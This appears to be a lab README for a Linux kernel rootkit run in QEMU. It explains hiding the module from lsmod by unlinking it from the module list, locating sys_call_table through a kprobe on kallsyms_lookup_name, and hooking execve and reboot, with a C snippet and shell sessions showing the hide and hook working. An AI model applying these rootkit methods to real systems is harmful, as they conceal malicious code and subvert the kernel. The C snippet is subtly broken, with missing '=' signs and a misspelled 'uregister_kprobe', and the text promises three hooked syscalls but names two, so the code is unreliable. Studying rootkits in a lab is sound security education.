# Part2: Rootkit

- Hide rootkit from `lsmod`
- Hook syscall

## Hide/Unhide Rootkit

We create a [character driver](https://linux-kernel-labs.github.io/refs/heads/master/labs/device_drivers.html) and design custom `ioctl` function to perform different actions based on different commands.

### Dependencies

- `linux/fs.h`
    - file_operations
    - alloc_chrdev_region
    - unregister_chrdev_region
- `linux/cdev.h`
    - cdev

### Design

- Access kernel modules list by `THIS_MODULE->list`.
- To hide the rootkit, record `prev place` and delete current place by `list_del()`.
- To unhide the rootkit, call `list_add()` to add current Kernel module after `prev place`.

## Hook syscall

Here we want to intercept these three syscalls:

- execve: record files executed by `execve` to `dmesg`.
- reboot: do not reboot.

### Design

- Search `kallsyms_lookup_name` by `kprobe`.
- Search `sys_call_table` by `kallsyms_lookup_name`.
- Record original syscalls and modify `sys_call_table` with new hooked syscalls.

### Kallsyms_lookup_name

After `kernel 5.7`, it does not export `kallsyms_lookup_name` by default.
We choose to use `kprobe` to search `kallsyms_lookup_name` in kernel.

#### Kprobe

Add the following code to `rootkit.c`:

```c
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name "kallsyms_lookup_name"
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t kallsyms_lookup_name;

/* register the kprobe */
register_kprobe(&kp);

/* assign kallsyms_lookup_name symbol to kp.addr */
kallsyms_lookup_name (kallsyms_lookup_name_t) kp.addr;

/* done with the kprobe, so unregister it */
uregister_kprobe(&kp);
```

## Usage

```sh
make all
cp rootkit.ko test_hook test_hide ../shared/

make qemu

...
Ubuntu 22.04 LTS
...
root@ubuntu:~# mount -t 9p -o trans=virtio shared /mnt
root@ubuntu:~# sudo insmod /mnt/rootkit.ko
root@ubuntu:~# sudo lsmod
root@ubuntu:~# dmesg # check major dev number, ex: 247
root@ubuntu:~# sudo mknod /dev/rootkit c 247 0
```

### Hide/Unhide

```sh
root@ubuntu:~# sudo lsmod
Module                  Size  Used by
rootkit                12288  0

root@ubuntu:~# /mnt/test_hide
root@ubuntu:~# sudo lsmod
Module                  Size  Used by
```

### Hook

```sh
root@ubuntu:~# /mnt/test_hook
root@ubuntu:~# dmesg
...
[  368.870260] rootkit: Hook sucessfully.
[  368.875159] rootkit: rootkit_release
[  370.514659] exec /usr/bin/dmesg
```

## Links

- https://xcellerator.github.io/posts/linux_rootkits_05/
- https://linux-kernel-labs.github.io/refs/heads/master/labs/device_drivers.html
- https://xcellerator.github.io/posts/linux_rootkits_01/
- https://xcellerator.github.io/posts/linux_rootkits_02/
- https://xcellerator.github.io/posts/linux_rootkits_11/